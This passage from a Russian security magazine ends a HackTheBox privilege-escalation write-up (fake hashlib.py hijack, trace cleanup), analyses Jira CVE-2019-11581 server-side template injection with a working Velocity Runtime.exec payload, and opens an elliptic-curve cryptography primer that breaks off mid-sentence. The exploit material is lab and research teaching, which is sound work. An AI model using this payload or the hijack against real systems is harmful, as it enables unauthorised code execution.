  plat‐x86_64‐linux‐gnu', '/usr/lib/python3.5/lib‐dynload', '/usr/local/
  lib/python3.5/dist‐packages', '/usr/lib/python3/dist‐packages']


Пустые кавычки в начале озна чают текущий рабочий каталог (CWD). То, что
надо! Создадим фейковую библиотеку hashlib.py с нужным нам пейлоадом
(можно построить реверс‐шелл или получить root‐сес сию так же, как и в пер‐
вом способе, но  для прос тоты  я  огра ничусь прос то выводом флага
на экран — идея ясна).



  richard@stratosphere:~$ echo 'import os; os.system("cat
  /root/root.txt")' > hashlib.py
  richard@stratosphere:~$ ls ‐l *.py
  ‐rw‐r‐‐r‐‐ 1 richard richard   43 Aug 11 12:45 hashlib.py
  ‐rwxr‐x‐‐‐ 1 root    richard 1507 Mar 19  2018 test.py


И со спокойной совестью запус тим скрипт:



  richard@stratosphere:~$ sudo /usr/bin/python ~/test.py
  d41d8cd9????????????????????????
  Solve: 5af003e100c80923ec04d65933d382cb

  C


Чистим следы пребывания в системе, и на этом все с этой виртуал кой.



  richard@stratosphere:~$ rm hashlib.py
  richard@stratosphere:~$ rm /dev/shm/input* /dev/shm/output*



ЭПИЛОГ: БРУТИМ ХЕШИ
Шутки ради попрошу сво его дру га Джона решить предлагаемые тестом хеши.





                    John the Ripper реверсит хеши

Скормим их /home/richard/test.py.



  richard@stratosphere:~$ sudo /usr/bin/python ~/test.py
  Solve: 5af003e100c80923ec04d65933d382cb
  kaybboo!
  You got it!
  Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff
  ninjaabisshinobi
  WOW, you're really good at this!
  How about this? 91ae5fc9ecbca9d346225063f23d2bd9
  legend72
  OK, OK! I get it. You know how to crack hashes...
  Last one, I promise: 9e‐
  febee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083 ead‐
  798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943
  Fhero6610
  sh: 1: /root/success.py: not found


Что и требовалось доказать. Мораль — не верь на слово подлым Python‐тес‐
там.





                             Трофей
ВЗЛОМ

  ОПЕРАЦИЯ
«ЛИПОСАКЦИЯ»
          КАК ИСПОЛЬЗОВАТЬ
     НОВУЮ УЯЗВИМОСТЬ В JIRA





                                                 aLLy
                                              ONsec
                                                    @iamsecurity





Jira — мегапопулярная система для отслеживания ошибок,
организации взаимо действия с пользователями и управле‐
ния проектами. Уязвимость позволяет атакующему выпол‐
нить произвольный код на целевой системе при помощи
обычного POST‐запроса, не обладая при этом никакими
привилегиями. Давай посмотрим на причины этого бага
и методы его эксплуата ции.


             INFO

                       Баг обнаружил исследователь Даниил Дмитриев.
                       Уязвимость получила статус критической и клас‐
                     сифицирует ся как CVE‐2019‐11581 — «Инъекция
                        в  серверные шаблоны  в  Jira  на  страницах
                       обратной связи с администратором и массовой
                       рассылки». Уязвимы версии с 4.4.0 до 7.6.14,
                        с   7.7.0  до   7.13.5,   с   8.0.0  до   8.0.3,
                        с 8.1.0 до 8.1.2, а так же начиная с 8.2.0 и закан‐
                       чивая 8.2.3.



СТЕНД
Воспроизвести необ ходимые для экс плуатации условия можно раз ными
методами. Я покажу два из них.


Метод 1: Docker
Самый легкий способ — взять готовые контейнеры Docker из репозитория
Vulhub. В файле ниже объ являются две машины: сама Jira и почтовый сервер.


CVE-2019-11581/docker-compose.yml
version: "2"
services:
  jira:
    image: vulhub/jira:8.1.0
    ports:
      ‐ "8080:8080"
    links:
      ‐ smtpd
  smtpd:
    build:
      context: .
      dockerfile: smtpd.Dockerfile

Машина с сервером имеет имя smtpd, где в качес тве демона SMTP выступает
стандартный модуль Python smtpd. Этой простейшей реализации достаточно,
чтобы продемонстрировать уяз вимость. На деле почтовый сервер может
быть абсолютно любым.


CVE-2019-11581/smtpd.Dockerfile
FROM python:3.6‐alpine3.9
COPY smtpd_server.py /smtpd_server.py
CMD ["python", "/smtpd_server.py"]
EXPOSE 1025


CVE-2019-11581/smtpd_server.py
import smtpd


class CustomSMTPServer(smtpd.SMTPServer):
  def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):
    r = data.decode("utf‐8").split("\n")
    for l in r:
      if l.startswith("Subject:"):
        sys.stdout.write("[{0}] {1}\n".format(time.time(),l))
    sys.stdout.flush()
    return


server = CustomSMTPServer(('0.0.0.0', 1025), None)
sys.stdout.write("[+] Start SMTPServer on 0.0.0.0:1025\n")

В  скрипте  исполь зуется  кастомный  обра ботчик  входящих  сооб щений
для того, чтобы логировать в консоль заголовок Subject. В нем будет содер‐
жаться пейлоад.
  Привести все это дело в рабочий вид можно одной командой:


docker‐compose up ‐d

После этого на порте 8080 будет запущен экземпляр сис темы Jira. Нужно
пройти несложный процесс установки, на одном этапе которого придется
получить триальный ключ. Ког да уста новка будет завершена, понадобится
еще несколько действий, чтобы можно было воспроизвести уязвимость.
  Сначала настроим Jira для работы с сервером SMTP. Для этого от имени
администратора переходим в раз дел «Сис тема → Исходящая почта» (System
→ Outgoing Mail) и нажимаем кноп ку «Добавить SMTP почтовый сервер» (Add
SMTP Mail Server). В появившейся форме ука зываем необходимые данные.





             Настрой ка подключения к серверу SMTP в Jira

Затем нужно вклю чить форму обратной свя зи. Эта настройка находится
в разделе «Основные нас трой ки» (General conﬁguration), кнопка «Ре дак‐
тировать настройки» (Edit Settings).





                  Стра ница основных настроек Jira

Нужно включить опцию «Форма свя зи с администра торами» (Contact Adminis‐
trators Form).





       Вклю чаем опцию «Форма обратной связи» в настройках Jira

Окружение готово.


Метод 2: руч ная установка
Для тестов готовых контейнеров будет дос таточно, но если хочешь глубже
погрузиться в происходящее, то дальше я рас ска жу про второй вариант стен‐
да.
   Его я буду исполь зовать для отладки, чтобы показать эксплуатацию
изнутри. Все манипуляции будут производиться на компьютере с Windows.
Сначала нужно скачать Atlassian SDK и уста новить его.
  Потом при помощи это го SDK генерируем шаб лон плагина.


atlas‐create‐jira‐plugin





       Генерация шаблона плагина для Jira с помощью Atlassian SDK

После этого будет создана директория с именем, которое было указано
в artifactId. Я буду выполнять отладку в IntelliJ IDEA, поэтому открою папку
с плагином в этой IDE. Здесь в файле pom.xml можно указать используемую
версию Jira. На момент написа ния статьи это была 7.13.0, и она уязвима, так
что можешь оставить как есть или поменять на любую другую непропатченную
версию.


pom.xml
<properties>
    <jira.version>8.1.0</jira.version>

Запускаем Jira в отладочном режиме и сбра сываем флаг atlassian.mail.
senddisabled, чтобы разрешить отправку почтовых сообщений.


atlas‐debug ‐‐product jira ‐Datlassian.mail.senddisabled=false

После запуска сервера нужно нас троить уда ленную отладку в IDEA. Для этого
переходим в окно редактирования конфигураций и создаем новый сетап типа
Remote.





              Настрой ка удален ной отладки в IntelliJ IDEA

По умолчанию порт для отладки — 5005, а веб‐интерфейс будет находиться
по адресу http://jirarce.vh:2990/jira.
   Теперь настраиваем Jira по ана логии с первым вариантом стенда и в
качестве сервера SMTP используем все тот же скрипт на Python.
   Тестовое окружение готово, и наконец‐то можно переходить к разбору
уязвимости.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

         ОПЕРАЦИЯ
     «ЛИПОСАКЦИЯ»
            КАК ИСПОЛЬЗОВАТЬ НОВУЮ УЯЗВИМОСТЬ
                                     В JIRA





ДЕТАЛИ УЯЗВИМОСТИ
Ссыл ка на объект нашего тестирова ния находится под формой авторизации.
Нажимаем на кнопку и попада ем в форму обратной связи.





           Форма для обратной свя зи с администратором

Запол няем ее как угодно, но перед отправкой ставим брейк‐пойнт в отладчи‐
ке на метод setActionProperty класса JiraSafeActionParameterSetter
и нажимаем Send.


WEB-INF/classes/com/atlassian/jira/webwork/
JiraSafeActionParameterSetter.java
038: public class JiraSafeActionParameterSetter {
...
099:     private void setActionProperty(Method setterMethod, Action
action, String[] paramValue) {
100:         Assertions.notNull("paramValue", paramValue);
101:         Assertions.notNull("setterMethod", setterMethod);
102:         Assertions.notNull("setterMethod", setterMethod.getPar
ameterTypes());
103:         Assertions.stateTrue("setterMethod", setterMethod.getPar
ameterTypes().length == 1);
104:         Class parameterType = setterMethod.getParameterTypes()[0
];
105:
106:         try {
107:             Object convertedObj;
108:             if (parameterType.equals(String.class)) {
109:                 convertedObj = paramValue[0];
110:             } else if (parameterType.equals(String[].class)) {
111:                 convertedObj = paramValue;
112:             } else {
113:                 ParameterConverter converter = KnownParameterC
onverters.getConverter(parameterType);
114:                 Assertions.notNull("converter", converter);
115:                 convertedObj = converter.convertParameter(paramV
alue, parameterType);
116:             }
117:
118:             setterMethod.invoke(action, convertedObj);

Отправленные данные формы попада ют в этот метод, и на основе типа
передаваемого параметра вызываются соответству ющие клас сы. Нам инте‐
ресно поле Subject.





   Обработка переданных данных формы обратной связи. Поле Subject

Как видишь, за него берется метод с говорящим наз ванием setSubject, что
в классе ContactAdministrators.


WEB-INF/classes/com/atlassian/jira/web/action/user/
ContactAdministrators.java
31: public class ContactAdministrators extends JiraWebActionSupport {
...
108:     public void setSubject(String subject) {
109:         this.subject = subject;
110:     }

Теперь в переменной subject хра нится собс твенно тема письма.





          В переменную subject записывается тема письма

Следующая  остановка —  ContactAdministrators.doExecute.  Здесь
вызывается метод send.


WEB-INF/classes/com/atlassian/jira/web/action/user/
ContactAdministrators.java
78:     @RequiresXsrfCheck
79:     protected String doExecute() throws Exception {
80:         if (!this.getShouldDisplayForm()) {
81:             return "modebreach";
82:         } else {
83:             this.send();
84:             return this.getRedirect("/secure/MyJiraHome.jspa");
85:         }
86:     }





       Вызов метода send внутри ContactAdministrators.doExecute

Здесь выполняется поиск активных адми нистраторов в системе, чтобы затем
каждому было отправлено наше письмо.


WEB-INF/classes/com/atlassian/jira/web/action/user/
ContactAdministrators.java
154:     public void send() throws MailException {
155:         Collection<ApplicationUser> administrators = this.
userUtil.getJiraAdministrators();
156:         Iterator var2 = administrators.iterator();
157:
158:         while(var2.hasNext()) {
159:             ApplicationUser administrator = (ApplicationUser)
var2.next();
160:             if (administrator.isActive()) {
161:                 this.sendTo(administrator);
162:             }
163:         }
164:
165:     }





  Метод send ищет активных администраторов в Jira для отправки сооб‐
  щения

Для этого управление передается в sendTo.


WEB-INF/classes/com/atlassian/jira/web/action/user/
ContactAdministrators.java
167:     private void sendTo(ApplicationUser administrator) throws
MailException {
168:         try {
169:             Map<String, Object> velocityParams = Maps.newHashMap
();
170:             velocityParams.put("from", this.replyTo);
171:             velocityParams.put("content", this.details);
172:             velocityParams.put("padSize", PADSIZE);
173:             Email email = new Email(administrator.getEma
ilAddress());
174:             email.setReplyTo(this.replyTo);
175:             MailQueueItem item = (new EmailBuilder(email, this.
getMimeType(administrator), I18nBean.getLocaleFromUser(administrator
))).withSubject(this.subject).withBodyFromFile(this.getTemplateDire
ctory(administrator) + "contactadministrator.vm").addParameters(
velocityParams).renderLater();
176:             this.mailQueue.addItem(item);

Здесь при помощи EmailBuilder фор миру ется будущее письмо. Затем
полученный объект клас са MailQueueItem добавляется в очередь сооб‐
щений для отправки.





  Добавление сооб щения в очередь для отправки админис тратору на поч‐
  ту

Обрати внимание на то, что шаблон для текста пись ма берется из файла WEB‐
INF/classes/templates/email/html/contactadministrator.vm  и  явля‐
ется     экземпляром     TemplateSources$File,     а     тема   —
TemplateSources$Fragment.





  Структура объекта MailQueueItem. Тема является экземпляром
  TemplateSources$Fragment

Перед отправкой сооб щения его нужно отрендерить. За работу с шаблонами
в Jira отвечает движок Velocity. Когда очередь дойдет до нашего письма,
будет вызван метод send класса RenderingMailQueueItem.


WEB-INF/classes/com/atlassian/jira/mail/builder/
RenderingMailQueueItem.java
12: public class RenderingMailQueueItem extends SingleMailQueueItem {
...
24:     public void send() throws MailException {
25:         try {
26:             this.emailRenderer.render();
...
31:         super.send();

Объект emailRenderer — это экземпляр класса EmailRenderer. Это его
метод render отве чает за одноимен ный процесс.





                Отладка рендеринга шаб лона письма


WEB-INF/classes/com/atlassian/jira/mail/builder/EmailRenderer.java
035: class EmailRenderer {
...
123:     public Email render() throws MessagingException {
124:         this.email.setSubject(this.renderEmailSubject(this.
templateParameters));


WEB-INF/classes/com/atlassian/jira/mail/builder/EmailRenderer.java
68:     private String renderEmailSubject(Map<String, Object> contex
tParams) {
69:         return this.getTemplatingEngine().render(this.subjec
tTemplate).applying(contextParams).asPlainText();
70:     }

Затем     инициализируется     движок      для     рендера   —
VelocityTemplatingEngine.


WEB-INF/classes/com/atlassian/jira/mail/builder/EmailRenderer.java
72:     private VelocityTemplatingEngine getTemplatingEngine() {
73:         return (VelocityTemplatingEngine)ComponentAccessor.getCom
ponent(VelocityTemplatingEngine.class);
74:     }

Движку передается шаблон темы письма. Метод applying создает экзем‐
пляр класса VelocityContext.


WEB-INF/classes/com/atlassian/jira/template/velocity/
DefaultVelocityTemplatingEngine.java
72:     class DefaultRenderRequest implements RenderRequest {
73:         private final TemplateSource source;
74:         private VelocityContext context = this.createContextFrom(
Collections.emptyMap());


WEB-INF/classes/com/atlassian/jira/template/velocity/
DefaultVelocityTemplatingEngine.java
33: public class DefaultVelocityTemplatingEngine implements Veloci
tyTemplatingEngine {
...
48:     public RenderRequest render(TemplateSource source) {
49:         return new DefaultVelocityTemplatingEngine.Defaul
tRenderRequest(source);
50:     }

В конце конструкции вызывается метод asPlainText.





                  Вызов метода asPlainText


WEB-INF/classes/com/atlassian/jira/template/velocity/
DefaultVelocityTemplatingEngine.java
91:         public String asPlainText() {
92:             return (new DefaultVelocityTemplatingEngine.Defaul
tRenderRequest.StringRepresentation() {
93:                 void with(StringWriter sw) throws IOException {
94:                     DefaultRenderRequest.this.asPlainText(sw);
95:                 }
96:             }).toString();
97:         }

Внутри выполняется цепочка вызовов toWriterImpl → writeEncodedBody‐
ForContent → evaluate.


WEB-INF/classes/com/atlassian/jira/template/velocity/
DefaultVelocityTemplatingEngine.java
107:         public void asPlainText(Writer writer) throws IOExce
ption {
108:             this.toWriterImpl(writer, false);
109:         }


WEB-INF/classes/com/atlassian/jira/template/velocity/
DefaultVelocityTemplatingEngine.java
115:         private void toWriterImpl(Writer writer, boolean attach
Cartridge) throws IOException {
116:             if (this.source instanceof File) {
...
123:             } else if (this.source instanceof Fragment) {
124:                 Fragment fragment = (Fragment)this.source;
...
129:                 DefaultVelocityTemplatingEngine.this.veloci
tyManager.writeEncodedBodyForContent(writer, fragment.getContent(),
this.context);


WEB-INF/lib/atlassian-velocity-1.3/com/atlassian/velocity/
DefaultVelocityManager.java
76:     public void writeEncodedBodyForContent(Writer writer, String
contentFragment, Context context) throws IOException
77:     {
...
84:         try
85:         {
86:             getVe().evaluate(context, writer, "getEncodedBodyF
romContent", contentFragment);
87:         }
88:         catch (Exception e)
89:         {
90:             exceptionHandling(writer, e, "", "");
91:         }
92:     }





  Обработка переданной темы письма. Цепочка вызовов toWriterImpl →
  writeEncodedBodyForContent → evaluate

Последний метод пытается рас парсить переданную в качестве темы строку.
Она разбивается на ноды, и они интерпретиру ются как конс трукции шаб‐
лонизатора Velocity.


WEB-INF/lib/velocity-1.6.4-atlassian-7/org/apache/velocity/
runtime/parser/Parser.java
61: public class Parser implements ParserTreeConstants, Parser
Constants {
...
91:     public Parser(RuntimeServices rs) {
...
97:     public SimpleNode parse(Reader reader, String templateName)
throws ParseException {
98:         SimpleNode sn = null;
99:         this.currentTemplateName = templateName;


WEB-INF/lib/velocity-1.6.4-atlassian-7/org/apache/velocity/
runtime/RuntimeInstance.java
053: public class RuntimeInstance implements RuntimeConstants, Runtim
eServices {
...
571:     public boolean evaluate(Context context, Writer out, String
logTag, String instring) throws IOException {
572:         return this.evaluate(context, out, logTag, (Reader)(new
StringReader(instring)));
573:     }
574:
575:     public boolean evaluate(Context context, Writer writer,
String logTag, Reader reader) throws IOException {
...
589:             return nodeTree == null ? false : this.render(
context, writer, logTag, nodeTree);
590:         }





                  Парсинг строки из темы пись ма

По сути, у нас здесь стандартная инъекция в шаблоны на стороне сервера,
или SSTI (Server‐Side Template Injection). Так как я отправлял ничего не зна‐
чащую строку, то сервер попытается отпра вить письмо с этой темой сооб‐
щения.





                   Коннекты к серверу SMTP от Jira

Для написания пол ноценного PoC нужен объект, который уже сущес твует
в контексте (VelocityContext).





      Список существу ющих переменных в контексте шаб лонизатора

Почти во всех замеченных на просторах интернета пейлоадах встречается
использование i18n, но можно взять любой объект, например application‐
Properties. Остальная часть PoC — вполне стандартное выполнение про‐
извольной команды через метод exec класса java.lang.Runtime. Будем
пытаться открыть калькулятор. Ука жем в качестве темы письма такую строку:


$applicationProperties.getClass().forName('java.lang.Runtime')
  .getMethod('getRuntime',null).invoke(null,null).exec('calc')
  .waitFor()

Перед отправкой формы поставим брейк‐пой нт на метод evaluate класса
RuntimeInstance.





              Используем PoC в качес тве темы письма

Немного потрейсим вперед и увидим, что последний вызов приходится
на ASTMethod.execute, где, с помощью invoke, начинает отрабаты вать наш
пейлоад.





        ASTMethod.execute передает управление полезной нагрузке


WEB-INF/lib/velocity-1.6.4-atlassian-7/org/apache/velocity/
runtime/parser/node/ASTMethod.java
020: public class ASTMethod extends SimpleNode {
...
047:     public Object execute(Object o, InternalContextAdapter
context) throws MethodInvocationException {
...
103:         try {
104:             Object obj = method.invoke(o, params);





  Стек вызова от начала рендеринга сооб щения до успешной эксплуата‐
  ции

Далее наблюдаем окошко калькулятора. :)


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Рассмотренная уязвимость час то встречается в приложениях, написанных
на Java. Теперь ты знаешь, на какой вектор стоит обратить особое внимание
при аудите окружения Java.
  Даниил Дмитриев не так давно находил похожую уяз вимость в работе сис‐
темы виджетов в Conﬂuence. Там мож но было внедрять целые файлы‐шаб‐
лоны. Этот баг, как и рассмотренный сегодня, был быстро пофикшен в новой
версии продукта. Так что не тяни с обновлениями!
ПРИВАТНОСТЬ

НЕПРОСТАЯ
  ГО ГУ     ЛИНАЗА





                              Ник Салливан





КРАТКИЙ ПУТЕВОДИТЕЛЬ
ПО ЭЛЛИПТИЧЕСКИМ КРИВЫМ




Эллиптическая крип тография  (Elliptic Curve  Cryptography,
ECC) — штука популярная, мощная и при этом не очень
понятная. Мы в Cloudﬂare используем ее вез де: от защиты
HTTPS‐соединений наших клиентов до передачи дан ных
между серверами. В этой статье я попытаюсь на простых
примерах показать, как все это работает.


             INFO

                      Это перевод статьи Ника Салливана, впервые
                       опубликован ной  в  блоге компании  Cloudﬂare.
                      Перевела Алёна Георгиева.


Вообще мы убеждены: чтобы доверять той или иной сис теме безопасности,
нужно понимать технологию, которая за ней сто ит. Так что мы решили найти
хорошее, относительно доступное руководс тво по ECC — и поделиться им
с читателями. Найти не уда лось, и мы написа ли его сами — оно перед вами.
  Предупреждаю: тема сложная, в двух словах о ней не расскажешь. Здесь
есть что обсудить, так что устра ивайся поудобней. Но если нужны те самые
два слова, то вот они: ECC — это новое поколение криптосистем с открытым
клю чом, которые построены на понятных матема тических основаниях и обес‐
печивают куда более серь езную защиту, чем крип тосис темы первого поколе‐
ния вроде RSA. Хочешь обеспечить высокий уровень защиты и сохранить
при этом производительность — имеет смысл обратиться к ECC. А если инте‐
ресуют детали — они ниже.


КРИПТОГРАФИЯ С ОТКРЫТЫМ КЛЮЧОМ: КАК ВСЕ НАЧИНАЛОСЬ
Историю криптографии можно разделить на два пери ода: клас сический
и современный. Водораз делом здесь служит 1977 год, когда одновременно
были представлены алгоритм RSA и про токол Диффи — Хеллмана. Случилась
настоящая революция: это были первые криптографичес кие системы, где
безопасность строилась на теории чисел. Стала воз можной безопасная ком‐
муникация без известного обеим сторонам — то есть симметричного —
шифра.  До  этого  криптогра фия  бесконечно  занималась  вопросом,
как безопасно переслать секретные шифры. Теперь же она могла обеспечить
доказательно  безопасную  коммуникацию  меж ду  двумя  сторонами —
без заботы о том, не перехватит ли кто обмен клю чами.





                   Уитфилд Диффи и Мартин Хеллман

Современная криптография стоит на том, что ключ для шифрования данных
может быть открытым, а вот ключ для дешифровки лучше оставить в секрете.
Такие системы называют криптогра фическими сис темами с открытым ключом
(public key cryptographic systems). Первая — и все еще самая распространен‐
ная из них — RSA. Она наз вана инициалами тех, кто впервые опи сал ее алго‐
ритм (Ron Rivest, Adi Shamir, Leonard Adleman).
   Хорошей криптографической системе с открытым ключом нужен набор
алгоритмов, которые легко пройти в одном нап равлении и трудно в обратном.
В случае с RSA «легкий» алго ритм умно жает два прос тых числа. Его «трудной»
парой будет факторизация — раз ложение получившегося результата на изна‐
чальные множители. Алгоритмы с такой характерис тикой — «просто в одну
сторону, трудно в обратную» — называют односторонней функцией с потай‐
ным входом (trapdoor function, TDF). Найти хорошую TDF критично важно
для создания безопасной криптогра фической сис темы с открытым ключом.
  Проще говоря, чем больше разрыв между сложностью прохождения фун‐
кции в одном направлении и в дру гом, тем надежней получится криптогра‐
фическая система, на ней основанная.


АЛГОРИТМ RSA В МИНИАТЮРЕ
RSA — самая популярная и наиболее понят ная из сис тем с открытым ключом.
Ее безопасность опирается на то, что умножение — это быстро, а раз‐
ложение на множители — медленно. Коротко рас смотрим, как выглядит
и работает маленькая RSA‐система.
  Системы с открытым ключом обычно имеют два компонента: откры тый
ключ и секретный ключ. Шифрование работает так: берешь сообщение, при‐
меняешь к нему математическую операцию — и получаешь чис ло, которое
выглядит случайным. При дешифровке берешь это «случайное» число и при‐
меняешь другую операцию, чтобы получить исходное сообщение. Зашиф‐
рованное с помощью открытого ключа можно расшифровать, только при‐
менив секретный ключ.
  Компьютеры не очень хорошо справляются с про извольно большими чис‐
лами. Эту проблему можно решить, если выб рать максимальное значение
и иметь дело только с числами, которые мень ше максимума. Работает это как
в  часах  с циферблатом  и  стрелками.  Как  перевес ти  их,  например,
на 37 часов? Очевидно, раз делить 37 на максимум — то есть 12 — и док‐
рутить остаток. Так и здесь: любые вычисления, дающие результат больше
максимума, мы «докручива ем» до числа в допус тимом диапазоне.
  В RSA максимальное значение (обозначим его max) получают умножением
двух случайных простых чисел. Открытый и секретный ключи — это два спе‐
циально выбранных числа больше нуля, но мень ше максимального значения,
обозначим их pub и priv. Что бы зашифровать число, мы перемножаем его
pub раз — и всякий раз «докручиваем», когда превышаем максимум. Чтобы
расшифровать сооб щение, перемножаем его priv раз по тому же правилу —
и получаем исходное число. Зву чит удивительно, но правда работает. Когда
обнаружили эту особен ность, она стала большим про рывом.
   Чтобы создать пару ключей для RSA, сна чала берешь два простых числа,
чтобы получить максимум (max). Затем выбираешь число для откры того ключа
(pub). До тех пор пока ты зна ешь два изначальных простых числа, ты можешь
вычислить секретный ключ priv через откры тый. Это то, как факторизация
соотносится  со  взло мом  RSA:  раз ложение  максимального  значения
на  исходные множители  позволяет  вычислить  чей‐то  секретный  ключ
по открытому и дешифровать личные сообщения.
   Рассмотрим все это на конкретном при мере. Возьмем простые чис‐
ла 13 и 7, перемножим и получим максимальное значение 91. В качестве
открытого ключа возьмем число 5. А затем, зная изначальные множители
и максимум, применим рас ширенный алгоритм Евклида и получим секретный
ключ — 29.
   Эти параметры (max = 91, pub = 5, priv = 29) определяют пол ностью
функциональную RSA‐систему. Мы можем взять число и перемножить его
пять раз для зашифровки, а затем взять получившийся результат, перем‐
ножить его 29 раз и получить изначальное число.
  Используем эти значения, чтобы зашифровать слово CLOUD.
   Чтобы представить сообщение математичес ки, нужно превратить буквы
в числа. Для представления латинского алфавита отлично подходит кодиров‐
ка UTF‐8. Каждому символу соот ветс твует свой номер.





               Латинский алфавит в кодировке UTF‐8

В этой кодировке CLOUD выглядит как 67, 76, 79, 85, 68. Все эти числа мень‐
ше нашего максимума, поэто му мы можем зашифровать их по отдельнос ти.


67 × 67 = 4489 = 30


             INFO

                     Откуда  30?  Поскольку  получив шееся   чис‐
                       ло 4489 больше мак симума, мы «докручиваем»
                        его до нужного нам диапазона  (от 0 до 91).
                     Для этого делим 4489 на 91 до целого числа
                      и берем остаток. Этим остатком и будет 30.



4489 = 91 × 49 + 30
30 × 67 = 2010 = 8
8 × 67 = 536 = 81
81 × 67 = 5427 = 58

58 и будет зашифрованной версией 67.
  Повторив этот процесс для каждой из букв, мы получим зашифрованное
сообщение CLOUD в виде


58, 20, 53, 50, 87

Чтобы расшифро вать это запутанное сооб щение, берем каждое из получив‐
шихся чисел — и точ но так же перемножа ем 29 раз.


58 × 58 = 3364 = 88 (помни, что мы «докручиваем» число, если оно
превышает максимум)
88 × 58 = 5104 = 8
…
9 × 58 = 522 = 67

Вуаля, мы вернулись к 67. Провернув то же самое с остальными числами, мы
получим исходное сооб щение.
  Вывод: ты можешь взять число, перемножить его сколько‐то (pub) раз
и получить случайно выглядящий результат, а потом перемножить его дру гое
количество (priv) раз и вернуться к изна чальному числу.


НЕ ТАКОЙ УЖ ТАЙНЫЙ ХОД
RSA и протокол Диффи — Хеллмана были столь мощны, потому что имели
строгие обоснования безопасности. Их авторы доказали, что взлом сис темы
равен решению математичес кой проблемы, которую, как считается, сложно
решить.  Факторизация —  хорошо  извес тная  проблема,  ее  изу чают
с античности (см. решето Эра тосфена). Любые прорывы в этой области ста‐
ли бы громкой новостью и озолотили изоб ретателя.





     «Найди мно жители — получи день ги» — тот самый T.K.G. (Reuters)

Тем не менее факториза ция не такая уж большая проблема, если решать ее
шаг за шагом. Для разложения на прос тые множите ли есть специальные
алгоритмы — например, квадратичное решето или об щий метод решета чис‐
лового поля, — и они умеренно успешны. Во вся ком случае, точно быстрее
и экономичней, чем наивный подход с уга дыва нием пар простых чисел.
  Эффективность этих алгоритмов рас тет, поскольку размер чисел, которые
нужно раскладывать на множители, все время увеличивается. А вот разрыв
между сложностью факториза ции и умно жения уменьшается — и тоже из‐за
роста чисел (нап ример, длины ключей). Ресурсы, дос тупные для дешифровки,
растут — и вместе с ними рас тет длина ключей, при чем куда быстрее. Это не
очень хорошо для мобильных и других маломощных девайсов, чьи вычис‐
лительные ресурсы ограничены. Раз рыв между разложением и умножением
не очень устойчив в долгосрочной перспективе.
  Все это значит, что RSA далеко не идеальная сис тема для криптографии
будущего. В иде альной TDF операции «туда» и «обратно» усложняются в оди‐
наковом темпе — пропорционально рас тущему размеру чисел. Нам нужен
потайной ход понадежней.


ЭЛЛИПТИЧЕСКИЕ КРИВЫЕ: ГДЕ НАЙТИ НАДЕЖНЫЙ ПОТАЙНОЙ
ХОД?
С появлением RSA и про токола Диффи — Хел лма на начал ся активный поиск
других математически обоснованных решений для криптографии, которые
могли бы послужить хорошей TDF. И вот в 1985 году были пред ложены алго‐
ритмы,  основанные  на  таинственном математическом  направлении —
эллиптических кривых.
  Но что же такое эллиптическая кривая — и как работает основанная на ней
TDF? К сожалению, в отличие от факториза ции — штуки, с которой мы неиз‐
бежно сталкиваемся в школе, — эллиптические кривые большинству людей
не близки. Понять и объяснить их не так‐то прос то — впрочем, я все равно
попытаюсь. (Если глаза уже начали стекленеть, можешь скипнуть до раздела
«Что все это значит?».)
  Эллиптическая кривая — это множество точек, удовлетворяющих конкрет‐
ному математическому уравнению. Выг лядит оно так:


y² = x³ + ax + b

Его график отдален но напоминает упавшую набок гречес кую букву Ω (оме га).





Есть и другие представления эллиптичес ких кривых, но технически это мно‐
жество точек, удовлетво ряющих уравнению с двумя переменными: одна
из них в квадрате, а другая — в кубе. Одна ко эллиптическая кривая — это не
просто симпатичная картинка: у нее есть ряд особенностей, которые делают
ее хорошей основой для криптогра фии.


СТРАННАЯ СИММЕТРИЯ
Еще раз взглянем на нашу эллиптичес кую кривую — и найдем те самые осо‐
бенности.
  Одна из них — горизон тальная симметрия. Каждую точку на кри вой можно
зеркально отразить по оси x — и ока жешь ся на все той же кривой. Еще инте‐
ресней то, что любая не стро го вер тикальная прямая пересекает эллиптичес‐
кую кривую не более чем в трех местах.
  Представим, что это такой странный бильярд. Если соединить две точки
на кривой, проходящая через них пря мая пересечет ее еще ровно в одном
месте. Поставим вооб ражаемый бильярдный шарик в точку A и толкнем его
в сторону точки B. Достигнув треть ей, пос ледней точки на кривой, шар отско‐
чит либо прямо вверх (если он находится ниже оси x), либо прямо вниз (если
он выше оси x) — на другую сторону кривой.





Мы можем соединить любые две точки на кривой и получить новую — нап‐
ример, соединив A и B, мы получили С.
  А еще мы можем свя зывать эти «ходы», чтобы раз за разом соединять
изначальную точ ку с получившимся результатом. Так, соединив точку A
с самой собой, мы получим точку B; из исходной точки A и получившейся B
выйдет C; А и С, в свою очередь, дадут D — и так далее.


             INFO

                         Что‐то знакомое, да? В RSA мы точно так же
                        сколько‐то раз умножали исходное число само
                       на себя — а  точнее, на  то,  что  получалось
                      при «док ручивании» результата умножения. Все
                        эти точки B, C, D и так далее — точно такие же
                      промежуточные результаты, только полученные
                      не арифметически, а геометрически.


Оказывается, если мы имеем две точки — изна чальную, «помноженную»
на себя n раз, и конечную — выяснить, чему равно n, довольно сложно. Чтобы
развить метафору со странным бильярдом, представь себе челове ка,
который сколько‐то времени игра ет в такой биль ярд — сам с самой и в зак‐
рытой комнате. Ему будет довольно просто толкать шарик снова и снова
по описанным выше правилам. Но если кто‐нибудь войдет в эту комнату
и увидит, где остановился шарик, то, даже зная пра вила игры и изначальную
точку, определить количес тво ударов о бортики он все равно не сможет —
пока не повторит все ходы от стартовой точки до финальной. «Легко туда,
трудно обратно» — это, как помнишь, основа для хорошей TDF.


                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ
         НЕПРОСТАЯ
        ЗАГОГУЛИНА
                         КРАТКИЙ ПУТЕВОДИТЕЛЬ
                  ПО ЭЛЛИПТИЧЕСКИМ КРИВЫМ





ВСЕ СТРАНЬШЕ И СТРАНЬШЕ
Упрощенная кривая из предыду щего раз дела прекрасно выглядит и объ ясня‐
ет общую концепцию эллиптических кривых, но не показывает, как выглядят
эллиптические кривые в криптографии.
   Здесь, как и в RSA, нам приходится огра ничивать себя числами в фик‐
